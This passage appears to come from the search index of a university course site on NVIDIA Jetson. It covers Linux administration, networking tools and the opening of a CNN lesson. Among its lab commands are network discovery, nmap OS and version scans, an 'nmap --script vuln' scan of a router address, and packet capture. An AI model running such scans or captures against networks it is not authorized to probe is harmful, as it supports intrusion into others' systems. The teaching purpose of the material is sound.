framerate=30,\n    flip_method=0,\n):\n    return (\n        \"nvarguscamerasrc ! \"\n        \"video/x-raw(memory:NVMM), \"\n        \"width=(int)%d, height=(int)%d, \"\n        \"format=(string)NV12, framerate=(fraction)%d/1 ! \"\n        \"nvvidconv flip-method=%d ! \"\n        \"video/x-raw, width=(int)%d, height=(int)%d, format=(string)BGRx ! \"\n        \"videoconvert ! \"\n        \"video/x-raw, format=(string)BGR ! appsink\"\n        % (\n            capture_width,\n            capture_height,\n            framerate,\n            flip_method,\n            display_width,\n            display_height,\n        )\n    )\n\n# Create camera capture\ncap = cv2.VideoCapture(gstreamer_pipeline(), cv2.CAP_GSTREAMER)\n\nif not cap.isOpened():\n    print(\"Cannot open camera\")\n    exit()\n\ntry:\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break\n\n        # Display frame\n        cv2.imshow('Jetson Camera', frame)\n\n        if cv2.waitKey(1) &amp; 0xFF == ord('q'):\n            break\n\nexcept KeyboardInterrupt:\n    pass\nfinally:\n    cap.release()\n    cv2.destroyAllWindows()\n</code></pre></p>"},{"location":"curriculum/02a_linux_basics/#power-management-and-performance","title":"\u26a1 Power Management and Performance","text":""},{"location":"curriculum/02a_linux_basics/#1-power-models-nvpmodel","title":"1. Power Models (nvpmodel)","text":"<pre><code># Check current power model\nsjsujetson@sjsujetson-01:~$ nvpmodel -q\nNV Power Mode: MAXN_SUPER\n2\n\n# List available power models\nnvpmodel -q --verbose\n\n# Set power model (requires sudo)\nsudo nvpmodel -m 0  # Maximum performance\nsudo nvpmodel -m 1  # Balanced\nsudo nvpmodel -m 2  # Power saving\n\n# Check power model configuration\ncat /etc/nvpmodel.conf\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#2-cpu-frequency-scaling","title":"2. CPU Frequency Scaling","text":"<pre><code># Check CPU frequency information\nsjsujetson@sjsujetson-01:~$ lscpu | grep MHz\nCPU max MHz:                        1728.0000\nCPU min MHz:                        115.2000\n\n# View CPU frequency scaling governors\ncat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor\ncat /sys/devices/system/cpu/cpu*/cpufreq/scaling_available_governors\n\n# Set CPU governor (requires sudo)\necho performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor\necho powersave | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor\n\n# Check current CPU frequencies\ncat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#3-gpu-frequency-and-power","title":"3. GPU Frequency and Power","text":"<pre><code># Check GPU frequency\ncat /sys/kernel/debug/bpmp/debug/clk/gpcclk/rate\ncat /sys/kernel/debug/bpmp/debug/clk/gpcclk/state\n\n# Monitor GPU usage\nsudo tegrastats --interval 1000\n\n# Check thermal zones\ncat /sys/class/thermal/thermal_zone*/type\ncat /sys/class/thermal/thermal_zone*/temp\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#advanced-system-administration","title":"\ud83d\udee0\ufe0f Advanced System Administration","text":""},{"location":"curriculum/02a_linux_basics/#system-monitoring-and-debugging","title":"\ud83d\udcca System Monitoring and Debugging","text":""},{"location":"curriculum/02a_linux_basics/#1-process-and-resource-monitoring","title":"1. Process and Resource Monitoring","text":"<pre><code># Advanced process monitoring\ntop -H  # Show threads\nhtop -t  # Tree view\niotop   # I/O monitoring\niftop   # Network monitoring\n\n# Process tree\npstree -p\npstree -u  # Show users\n\n# Detailed process information\nps aux --forest\nps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu\n\n# Memory analysis\ncat /proc/meminfo\nfree -h\nvmstat 1 5  # Virtual memory statistics\n\n# Disk I/O statistics\niostat -x 1 5\nlsof +D /path/to/directory  # Files open in directory\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#2-system-logs-and-debugging","title":"2. System Logs and Debugging","text":"<pre><code># systemd journal\njournalctl -f  # Follow logs\njournalctl -u service_name  # Service-specific logs\njournalctl --since \"2024-01-01\" --until \"2024-01-02\"\njournalctl -p err  # Error level and above\n\n# Kernel logs\ndmesg | tail -50\ndmesg -T  # Human-readable timestamps\ndmesg -l err,warn  # Error and warning levels\n\n# System logs\ntail -f /var/log/syslog\ntail -f /var/log/kern.log\n\n# Boot analysis\nsystemd-analyze\nsystemd-analyze blame  # Service startup times\nsystemd-analyze critical-chain  # Critical path\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#3-network-diagnostics","title":"3. Network Diagnostics","text":"<pre><code># Network interface configuration\nip addr show\nip route show\nip link show\n\n# Network connectivity\nping -c 4 google.com\ntraceroute google.com\nmtr google.com  # Continuous traceroute\n\n# Port scanning and connections\nnmap -sT localhost\nss -tuln  # Socket statistics\nnetstat -tuln  # Network connections\nlsof -i :22  # Processes using port 22\n\n# Network traffic analysis\nsudo tcpdump -i eth0 -n\nsudo tcpdump -i any port 22\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#package-management-and-software-installation","title":"\ud83d\udd27 Package Management and Software Installation","text":""},{"location":"curriculum/02a_linux_basics/#1-apt-package-manager","title":"1. APT Package Manager","text":"<pre><code># Update package lists\nsudo apt update\n\n# Upgrade packages\nsudo apt upgrade\nsudo apt full-upgrade\n\n# Search packages\napt search keyword\napt show package_name\n\n# Install packages\nsudo apt install package_name\nsudo apt install ./local_package.deb\n\n# Remove packages\nsudo apt remove package_name\nsudo apt purge package_name  # Remove config files too\nsudo apt autoremove  # Remove unused dependencies\n\n# Package information\ndpkg -l | grep package_name\ndpkg -L package_name  # List files in package\ndpkg -S /path/to/file  # Find package containing file\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#2-snap-package-manager","title":"2. Snap Package Manager","text":"<pre><code># List installed snaps\nsnap list\n\n# Search snaps\nsnap find keyword\n\n# Install snap\nsudo snap install package_name\n\n# Update snaps\nsudo snap refresh\nsudo snap refresh package_name\n\n# Remove snap\nsudo snap remove package_name\n\n# Snap information\nsnap info package_name\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#3-building-from-source","title":"3. Building from Source","text":"<pre><code># Install build tools\nsudo apt install build-essential cmake git\n\n# Example: Building a simple C program\ncat &gt; hello.c &lt;&lt; EOF\n#include &lt;stdio.h&gt;\nint main() {\n    printf(\"Hello, Jetson!\\n\");\n    return 0;\n}\nEOF\n\n# Compile\ngcc -o hello hello.c\n./hello\n\n# Example: CMake project\nmkdir build &amp;&amp; cd build\ncmake ..\nmake -j$(nproc)\nsudo make install\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#security-and-user-management","title":"\ud83d\udd10 Security and User Management","text":""},{"location":"curriculum/02a_linux_basics/#user-and-group-management","title":"\ud83d\udc65 User and Group Management","text":"<pre><code># User information\nid\nwhoami\ngroups\nw  # Who is logged in\nlast  # Login history\n\n# Create user\nsudo useradd -m -s /bin/bash newuser\nsudo passwd newuser\n\n# Modify user\nsudo usermod -aG sudo newuser  # Add to sudo group\nsudo usermod -s /bin/zsh newuser  # Change shell\n\n# Delete user\nsudo userdel -r newuser  # Remove home directory too\n\n# Group management\nsudo groupadd newgroup\nsudo usermod -aG newgroup username\nsudo gpasswd -d username groupname  # Remove from group\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#file-permissions-and-security","title":"\ud83d\udd12 File Permissions and Security","text":"<pre><code># File permissions\nls -la\nstat filename\n\n# Change permissions\nchmod 755 filename  # rwxr-xr-x\nchmod u+x filename  # Add execute for user\nchmod g-w filename  # Remove write for group\nchmod o=r filename  # Set read-only for others\n\n# Change ownership\nsudo chown user:group filename\nsudo chown -R user:group directory/\n\n# Special permissions\nchmod +t directory/  # Sticky bit\nchmod g+s directory/  # Set GID\nchmod u+s filename   # Set UID (SUID)\n\n# Access Control Lists (ACL)\ngetfacl filename\nsetfacl -m u:username:rw filename\nsetfacl -x u:username filename\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#system-security","title":"\ud83d\udee1\ufe0f System Security","text":"<pre><code># Firewall (UFW)\nsudo ufw status\nsudo ufw enable\nsudo ufw allow 22/tcp  # SSH\nsudo ufw allow 80/tcp  # HTTP\nsudo ufw deny 23/tcp   # Telnet\nsudo ufw delete allow 80/tcp\n\n# SSH security\nsudo systemctl status ssh\nsudo nano /etc/ssh/sshd_config\n# Recommended changes:\n# PermitRootLogin no\n# PasswordAuthentication no\n# PubkeyAuthentication yes\nsudo systemctl restart ssh\n\n# Generate SSH key pair\nssh-keygen -t ed25519 -C \"your_email@example.com\"\ncat ~/.ssh/id_ed25519.pub  # Public key\n\n# System updates and security\nsudo apt update &amp;&amp; sudo apt upgrade\nsudo apt install unattended-upgrades\nsudo dpkg-reconfigure unattended-upgrades\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/","title":"\ud83c\udf10 Introduction to Linux and Networking Tools","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/03a_linux_networking_tools/#part-1-basic-computer-networking-concepts","title":"\ud83e\udde0 Part 1: Basic Computer Networking Concepts","text":"<p>Before using tools, it's essential to understand the fundamental components of computer networks:</p>"},{"location":"curriculum/03a_linux_networking_tools/#key-concepts","title":"\ud83d\udce1 Key Concepts","text":"Concept Description IP Address Unique identifier for a device on a network (e.g., 192.168.1.10) Subnet Logical subdivision of a network Gateway Device that routes traffic to other networks DNS Domain Name System \u2014 translates domain names into IP addresses MAC Address Hardware address of a network interface DHCP Automatically assigns IP addresses on a network NAT Network Address Translation \u2014 allows multiple devices to share one IP Port Logical access channel for communication (e.g., port 22 = SSH)"},{"location":"curriculum/03a_linux_networking_tools/#network-types","title":"\ud83d\udd00 Network Types","text":"<ul> <li>LAN (Local Area Network): Limited to a building or campus</li> <li>WAN (Wide Area Network): Broader networks like the internet</li> <li>Switch: Connects devices within LAN</li> <li>Router: Connects LAN to WAN</li> </ul>"},{"location":"curriculum/03a_linux_networking_tools/#part-2-the-5-layers-of-computer-networking-simplified-tcpip-model","title":"\ud83e\udde9 Part 2: The 5 Layers of Computer Networking (Simplified TCP/IP Model)","text":"<p>Computer networking is typically divided into 5 abstract layers, each with specific responsibilities and headers:</p> Layer Purpose Example Protocols Header Example Application Interface for user applications HTTP, SSH, DNS, FTP HTTP headers, DNS records Transport Ensures reliable communication, manages ports TCP, UDP TCP/UDP header (port #s) Network Routing and addressing between networks IP, ICMP IP header (IP address) Data Link Direct link communication on local network Ethernet, Wi-Fi (802.11) MAC header Physical Transmission of bits over physical medium Cables, Wi-Fi radios Voltage/pulse or RF wave"},{"location":"curriculum/03a_linux_networking_tools/#linux-implementation-of-each-layer","title":"\ud83d\udee0\ufe0f Linux Implementation of Each Layer","text":"Layer Linux Tools / Files Kernel/Driver Components Application curl, wget, ssh, scp User space tools Transport ss, netstat, iptables TCP/UDP stacks in kernel (net/ipv4) Network ip, ifconfig, traceroute, ip rule IP routing tables, netfilter Data Link ethtool, iw, nmcli Network driver, MAC layer Physical rfkill, iwconfig, hciconfig Wi-Fi/Bluetooth chip drivers"},{"location":"curriculum/03a_linux_networking_tools/#network-discovery-and-performance-testing","title":"\ud83e\uddea Network Discovery and Performance Testing","text":"<p>All network packages used in this section are arealdy installed in the container. Run the following commands to start the default container: <pre><code>sjsujetsontool shell\n</code></pre></p> <p>Check Interfaces and IP Address</p> <p>Install net-tools (Debian/Ubuntu-based) <pre><code>#apt install -y net-tools #already installed in the container, This will install: ifconfig, netstat, route, arp, etc.\nifconfig\n</code></pre></p> <p>Modern Linux systems prefer ip command from iproute2: <pre><code>#apt install -y iproute2 #already installed in the container\nip a\nip addr\nip link\n</code></pre></p>"},{"location":"curriculum/03a_linux_networking_tools/#discover-devices-on-lan","title":"\ud83c\udf10 Discover Devices on LAN","text":"<pre><code>nmap -sn 192.168.1.0/24\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#measure-speed-and-latency","title":"\ud83d\udcca Measure Speed and Latency","text":""},{"location":"curriculum/03a_linux_networking_tools/#iperf3-network-bandwidth-testing","title":"<code>iperf3</code> \u2014 Network Bandwidth Testing","text":"<pre><code># On one device (server):\niperf3 -s\n\n# On another device (client):\niperf3 -c &lt;server-ip&gt;\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#ping-latency-test","title":"<code>ping</code> \u2014 Latency Test","text":"<pre><code>#apt install -y iputils-ping\nping google.com\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#speedtest-cli-internet-speed-test","title":"<code>speedtest-cli</code> \u2014 Internet Speed Test","text":"<pre><code>#sudo apt install speedtest-cli #already installed in the container\nroot@sjsujetson-01:/Developer# speedtest-cli\n</code></pre> <p>\ud83e\uddf0 Part 3: Linux Networking Tools Summary</p> Tool Purpose <code>ip</code> IP and interface management <code>ping</code> Test connectivity <code>ss</code> Check open ports/sockets <code>nmap</code> Network discovery and scanning <code>ufw</code> Basic firewall management <code>curl/wget</code> Web requests and file download <code>nmcli</code> Network connection and Wi-Fi control <code>bluetoothctl</code> Bluetooth device scanning and pairing <code>iperf3</code> Network throughput measurement <code>speedtest-cli</code> Measure Internet bandwidth and latency"},{"location":"curriculum/03a_linux_networking_tools/#wi-fi-and-bluetooth-networking","title":"\ud83d\udcf6 Wi-Fi and Bluetooth Networking","text":"<p>Jetson supports both Wi-Fi and Bluetooth, often via M.2 cards or USB dongles.</p>"},{"location":"curriculum/03a_linux_networking_tools/#wi-fi-management-tools","title":"\ud83d\udce1 Wi-Fi Management Tools","text":"<pre><code>nmcli device wifi list      # Scan for Wi-Fi networks\nnmcli device wifi connect &lt;SSID&gt; password &lt;password&gt;\niwconfig                   # View wireless settings (deprecated)\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#bluetooth-tools","title":"\ud83d\udd35 Bluetooth Tools","text":"<pre><code>bluetoothctl               # Interactive Bluetooth manager\nrfkill list                # Check if Bluetooth/Wi-Fi are blocked\nhciconfig                  # View Bluetooth device configuration\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#advanced-network-protocol-analysis","title":"\ud83d\udd2c Advanced Network Protocol Analysis","text":""},{"location":"curriculum/03a_linux_networking_tools/#understanding-network-headers","title":"\ud83d\udcca Understanding Network Headers","text":"<p>Each layer adds its own header to the data packet. Let's examine how to inspect these headers on Jetson:</p>"},{"location":"curriculum/03a_linux_networking_tools/#packet-capture-with-tcpdump","title":"\ud83d\udd0d Packet Capture with <code>tcpdump</code>","text":"<pre><code># Install tcpdump if not available\n#root@sjsujetson-01:/Developer# apt install tcpdump #already installed inside the container\n\n# Capture packets on specific interface\nroot@sjsujetson-01:/Developer# tcpdump -i wlP1p1s0 -n -c 10\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on wlP1p1s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n.....\n\n# Capture HTTP traffic\nroot@sjsujetson-01:/Developer# tcpdump -i any port 80 -A\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n.....\n\n# Capture with detailed headers\nroot@sjsujetson-01:/Developer# tcpdump -i any -v -n icmp\ntcpdump: data link type LINUX_SLL2\ntcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#layer-by-layer-analysis","title":"\ud83c\udf10 Layer-by-Layer Analysis","text":"Layer Header Fields Linux Command to Inspect Application HTTP methods, DNS queries <code>curl -v</code>, <code>dig</code>, <code>nslookup</code> Transport Source/Dest ports, TCP flags <code>ss -tuln</code>, <code>netstat -tuln</code> Network Source/Dest IP, TTL <code>ip route</code>, <code>traceroute</code> Data Link MAC addresses, VLAN tags <code>ip link</code>, <code>ethtool</code> Physical Signal strength, channel <code>iwconfig</code>, <code>iw dev wlan0 scan</code>"},{"location":"curriculum/03a_linux_networking_tools/#protocol-specific-tools","title":"\ud83d\udd27 Protocol-Specific Tools","text":""},{"location":"curriculum/03a_linux_networking_tools/#dns-analysis","title":"DNS Analysis","text":"<pre><code>#These are already installed inside the container\n# apt update\n# # Install dig and nslookup (part of dnsutils)\n# apt install -y dnsutils\n# # Install 'time' command (optional, usually pre-installed)\n# apt install -y time\n\n# Query DNS records\ndig google.com\nnslookup google.com\n\n# Check DNS resolution time\ntime nslookup google.com\n\n# Use specific DNS server\ndig @8.8.8.8 google.com\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#tcp-connection-analysis","title":"TCP Connection Analysis","text":"<pre><code># Show TCP connection states\nss -tuln\n\n# Monitor TCP connections in real-time\nwatch -n 1 'ss -tuln | grep :22'\n\n# Check TCP window scaling\nss -i\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#advanced-linux-network-tools","title":"\ud83d\udee0\ufe0f Advanced Linux Network Tools","text":""},{"location":"curriculum/03a_linux_networking_tools/#network-troubleshooting-arsenal","title":"\ud83d\udd0d Network Troubleshooting Arsenal","text":"Tool Purpose Example Installation <code>traceroute</code> Trace packet path <code>traceroute google.com</code> <code>sudo apt install traceroute</code> <code>mtr</code> Continuous traceroute <code>mtr google.com</code> <code>sudo apt install mtr</code> <code>netstat</code> Network statistics <code>netstat -rn</code> (routing table) <code>sudo apt install net-tools</code> <code>lsof</code> List open files/sockets <code>lsof -i :22</code> (SSH connections) <code>sudo apt install lsof</code> <code>tcpdump</code> Packet capture <code>sudo tcpdump -i wlan0</code> <code>sudo apt install tcpdump</code> <code>wireshark</code> GUI packet analyzer <code>sudo wireshark</code> <code>sudo apt install wireshark</code>+ Add user to group: <code>sudo usermod -aG wireshark $USER</code> <code>ethtool</code> Ethernet tool <code>ethtool eth0</code> <code>sudo apt install ethtool</code> <code>iw</code> Wireless tools <code>iw dev wlan0 info</code> <code>sudo apt install iw</code> <p>All these tools are already installed inside the container, run <code>sjsujetsontool shell</code> to enter into the container.</p> <p>Packet Capture and Basic Analysis <pre><code># Terminal 1: Capture all packets across interfaces\nroot@sjsujetson-01:/Developer# tcpdump -i any -w network_capture.pcap\n\n# Terminal 2: Generate some traffic\nping -c 10 google.com\ncurl -I https://www.google.com\n\n# Terminal 1: Ctrl+C to stop capture\n\n#CLI analysis\nroot@sjsujetson-01:/Developer# tcpdump -r network_capture.pcap -n\n</code></pre></p>"},{"location":"curriculum/03a_linux_networking_tools/#wireless-network-deep-dive","title":"\ud83d\udce1 Wireless Network Deep Dive","text":""},{"location":"curriculum/03a_linux_networking_tools/#wi-fi-interface-management","title":"Wi-Fi Interface Management","text":"<pre><code>iw dev\n\n# Detailed wireless info\niw dev wlP1p1s0 info\n\n# Check wireless statistics\ncat /proc/net/wireless\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#bluetooth-low-energy-ble-on-jetson","title":"Bluetooth Low Energy (BLE) on Jetson","text":"<pre><code># Install Bluetooth tools, already in container\n#apt install bluez bluez-tools\n\n# Scan for BLE devices\nhcitool lescan\n\n# Get device info\nhciconfig hci0\n\n# Monitor Bluetooth traffic\nbtmon\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#network-security-tools","title":"\ud83d\udd12 Network Security Tools","text":""},{"location":"curriculum/03a_linux_networking_tools/#port-scanning-and-security","title":"Port Scanning and Security","text":"<pre><code>#apt install -y nmap\n\n#Check Open Ports on Jetson\nroot@sjsujetson-01:/Developer# nmap -sS localhost\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 01:49 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000014s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n111/tcp open  rpcbind\n631/tcp open  ipp\n\n# Comprehensive port scan\nnmap -sS -O -sV 192.168.1.1\n\n# Scan for vulnerabilities\nnmap --script vuln 192.168.1.1\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#firewall-management-need-host-sudo","title":"Firewall Management (need host sudo)","text":"<pre><code># UFW (Uncomplicated Firewall)\nsudo apt install -y ufw\nsudo ufw enable\nsudo ufw allow ssh\nsudo ufw allow 8080/tcp\nsudo ufw status verbose\n# iptables (advanced)\nsudo iptables -L -n -v\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#network-layer-analysis","title":"\ud83d\udccb Network Layer Analysis","text":""},{"location":"curriculum/03a_linux_networking_tools/#task-11-packet-capture-and-analysis","title":"Task 1.1: Packet Capture and Analysis","text":"<p>In this task, you'll learn how to capture and analyze network traffic using <code>tcpdump</code>.</p> <pre><code># Terminal 1 (inside the container): Start packet capture\nroot@sjsujetson-01:/Developer# tcpdump -i any -w network_capture.pcap\ntcpdump: data link type LINUX_SLL2\ntcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n\n# Terminal 2 (inside the container): Generate traffic\nroot@sjsujetson-01:/workspace# ping -c 10 google.com\nroot@sjsujetson-01:/workspace# curl -I https://www.google.com\n\n# Stop capture (Ctrl+C in Terminal 1)\n# Analyze captured packets\nroot@sjsujetson-01:/Developer# tcpdump -r network_capture.pcap -n\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#task-12-layer-by-layer-inspection","title":"Task 1.2: Layer-by-Layer Inspection","text":"<p>This task demonstrates how to inspect network traffic at different OSI model layers.</p> <pre><code># Physical layer - Wi-Fi signal (not permitted in Jetson)\n# iw dev wlP1p1s0 scan | grep -A 5 -B 5 \"signal:\"\n\n# Data link layer - MAC addresses\nip link show\narp -a\n\n# Network layer - IP routing\nip route show\ntraceroute 8.8.8.8 # apt install traceroute\n\n# Transport layer - TCP/UDP ports\nss -tuln\nlsof -i # run `sudo lsof -i` in host for more detailed output\n\n# Application layer - HTTP headers\ncurl -v http://httpbin.org/get\n</code></pre>"},{"location":"curriculum/03a_linux_networking_tools/#using-wireshark-and-tshark","title":"Using Wireshark and Tshark","text":"<p>Tshark is the command-line version of Wireshark, a powerful network protocol analyzer. Follow these steps to set it up:</p> <ol> <li>Install Tshark and configure permissions:</li> </ol> <pre><code>apt install -y tshark\nroot@sjsujetson-00:/workspace# which dumpcap\n/usr/bin/dumpcap\nroot@sjsujetson-00:/workspace# setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap\nroot@sjsujetson-00:/workspace# getcap /usr/bin/dumpcap\n/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip\n</code></pre> <ol> <li>Capture packets using Tshark:</li> </ol> <pre><code>root@sjsujetson-00:/workspace# tshark -i wlP1p1s0\n</code></pre> <ol> <li>Test X11 window forwarding with a simple application:</li> </ol> <pre><code>apt install -y x11-apps\nxeyes\n</code></pre> <ol> <li>Install Wireshark with GUI support:</li> </ol> <pre><code>apt update\nroot@sjsujetson-00:/workspace# DEBIAN_FRONTEND=noninteractive apt install -y wireshark\n</code></pre> <ol> <li>Run Wireshark inside the container: <pre><code>wireshark\n</code></pre></li> </ol>"},{"location":"curriculum/03a_linux_networking_tools/#additional-resources","title":"\ud83d\udd17 Additional Resources","text":"<ul> <li>Linux Network Administrators Guide</li> <li>Wireshark User Guide</li> <li>NVIDIA Jetson Linux Developer Guide</li> <li>TCP/IP Illustrated Series</li> <li>Network Programming with Python</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/","title":"04 deeplearning cnn","text":"<p>\ud83e\udde0 Deep Learning &amp; CNNs for Image Classification on Jetson</p>"},{"location":"curriculum/04_deeplearning_cnn/#learning-objectives","title":"\ud83c\udfaf Learning Objectives","text":"<p>By the end of this tutorial, you will: - Understand deep learning fundamentals and CNN architecture - Implement basic and advanced CNN models using the Jetson CNN Toolkit - Optimize CNN inference on Jetson devices using various techniques - Deploy production-ready image classification systems</p>"},{"location":"curriculum/04_deeplearning_cnn/#deep-learning-theoretical-foundations","title":"\ud83e\udde0 Deep Learning Theoretical Foundations","text":""},{"location":"curriculum/04_deeplearning_cnn/#what-is-deep-learning","title":"What is Deep Learning?","text":"<p>Deep learning is a subset of machine learning that uses artificial neural networks with multiple layers (hence \"deep\") to model and understand complex patterns in data. For image classification, deep learning has revolutionized computer vision by automatically learning hierarchical feature representations.</p>"},{"location":"curriculum/04_deeplearning_cnn/#key-concepts","title":"Key Concepts","text":""},{"location":"curriculum/04_deeplearning_cnn/#1-neural-network-basics","title":"1. Neural Network Basics","text":"<ul> <li>Neuron: Basic computational unit that applies weights, bias, and activation function</li> <li>Layer: Collection of neurons that process input simultaneously</li> <li>Forward Propagation: Data flows from input to output through layers</li> <li>Backpropagation: Error flows backward to update weights during training</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#2-deep-learning-vs-traditional-ml","title":"2. Deep Learning vs Traditional ML","text":"Aspect Traditional ML Deep Learning Feature Engineering Manual feature extraction Automatic feature learning Data Requirements Works with small datasets Requires large datasets Computational Cost Lower Higher Performance Good for simple patterns Excellent for complex patterns Interpretability Higher Lower (black box)"},{"location":"curriculum/04_deeplearning_cnn/#3-why-deep-learning-for-images","title":"3. Why Deep Learning for Images?","text":"<ul> <li>Hierarchical Learning: Lower layers detect edges, higher layers detect objects</li> <li>Translation Invariance: Can recognize objects regardless of position</li> <li>Scale Invariance: Can handle objects of different sizes</li> <li>Robustness: Handles variations in lighting, rotation, and occlusion</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#mathematical-foundations","title":"Mathematical Foundations","text":""},{"location":"curriculum/04_deeplearning_cnn/#convolution-operation","title":"Convolution Operation","text":"<p>The convolution operation is fundamental to CNNs. It involves sliding a filter (kernel) across an input image to detect features. The mathematical representation is:</p> <p>Output[i,j] = \u03a3 \u03a3 Input[i+m, j+n] * Kernel[m,n]</p> <p>The Jetson CNN Toolkit includes a demonstration of 2D convolution operations for educational purposes, showing how edge detection kernels work on sample images.</p>"},{"location":"curriculum/04_deeplearning_cnn/#activation-functions","title":"Activation Functions","text":"<p>Activation functions introduce non-linearity into neural networks, enabling them to learn complex patterns:</p> <ul> <li>ReLU (Rectified Linear Unit): f(x) = max(0, x) - Most commonly used</li> <li>Sigmoid: f(x) = 1/(1+e^(-x)) - Outputs between 0 and 1</li> <li>Tanh: f(x) = tanh(x) - Outputs between -1 and 1</li> <li>Leaky ReLU: f(x) = max(0.01x, x) - Prevents dying ReLU problem</li> </ul> <p>The toolkit includes visualization capabilities for comparing different activation functions and their characteristics.</p>"},{"location":"curriculum/04_deeplearning_cnn/#cnn-architecture-deep-dive","title":"\ud83c\udfd7\ufe0f CNN Architecture Deep Dive","text":""},{"location":"curriculum/04_deeplearning_cnn/#convolutional-neural-networks-cnns","title":"Convolutional Neural Networks (CNNs)","text":"<p>CNNs are specialized deep neural networks designed for processing grid-like data such as images. They use convolution operations to detect local features and build hierarchical representations.</p>"},{"location":"curriculum/04_deeplearning_cnn/#cnn-layer-types","title":"CNN Layer Types","text":""},{"location":"curriculum/04_deeplearning_cnn/#1-convolutional-layer","title":"1. Convolutional Layer","text":"<ul> <li>Purpose: Feature extraction using learnable filters</li> <li>Parameters: Filter size, stride, padding, number of filters</li> <li>Output: Feature maps highlighting detected patterns</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#2-activation-layer","title":"2. Activation Layer","text":"<ul> <li>Purpose: Introduce non-linearity</li> <li>Common: ReLU, Leaky ReLU, ELU</li> <li>Effect: Enables learning of complex patterns</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#3-pooling-layer","title":"3. Pooling Layer","text":"<ul> <li>Purpose: Spatial downsampling and translation invariance</li> <li>Types: Max pooling, Average pooling, Global pooling</li> <li>Benefits: Reduces computational cost and overfitting</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#4-normalization-layer","title":"4. Normalization Layer","text":"<ul> <li>Purpose: Stabilize training and improve convergence</li> <li>Types: Batch Normalization, Layer Normalization, Group Normalization</li> <li>Benefits: Faster training, better generalization</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#5-fully-connected-layer","title":"5. Fully Connected Layer","text":"<ul> <li>Purpose: Final classification or regression</li> <li>Position: Usually at the end of the network</li> <li>Function: Maps features to output classes</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#cnn-architecture-implementation","title":"CNN Architecture Implementation","text":"<p>The Jetson CNN Toolkit provides a comprehensive <code>BasicCNN</code> class that demonstrates proper CNN architecture design:</p> <ul> <li>Feature Extraction Layers: Three convolutional blocks with increasing channel depth (32\u219264\u2192128)</li> <li>Batch Normalization: Applied after each convolution for training stability</li> <li>Pooling Strategy: Max pooling for spatial downsampling, adaptive pooling for variable input sizes</li> <li>Classification Head: Fully connected layers with dropout for regularization</li> </ul> <p>The toolkit's <code>BasicCNN</code> implementation supports configurable input channels and output classes, making it suitable for various image classification tasks from CIFAR-10 to ImageNet-scale problems.</p>"},{"location":"curriculum/04_deeplearning_cnn/#cnn-implementation-with-jetson-toolkit","title":"\ud83d\udcbb CNN Implementation with Jetson Toolkit","text":""},{"location":"curriculum/04_deeplearning_cnn/#cifar-10-classification-example","title":"CIFAR-10 Classification Example","text":"<p>The Jetson CNN Toolkit provides a comprehensive implementation for image classification tasks. The toolkit includes several CNN architectures optimized for NVIDIA Jetson devices.</p>"},{"location":"curriculum/04_deeplearning_cnn/#basic-cnn-architecture","title":"Basic CNN Architecture","text":"<p>The toolkit's <code>BasicCNN</code> class demonstrates a well-structured CNN design:</p> <ul> <li>Convolutional Blocks: Three sequential blocks with increasing feature depth (32\u219264\u2192128 channels)</li> <li>Batch Normalization: Applied after each convolution for training stability</li> <li>Pooling Strategy: Max pooling for spatial downsampling</li> <li>Classification Head: Fully connected layers with dropout regularization</li> <li>Adaptive Design: Supports variable input sizes through adaptive pooling</li> 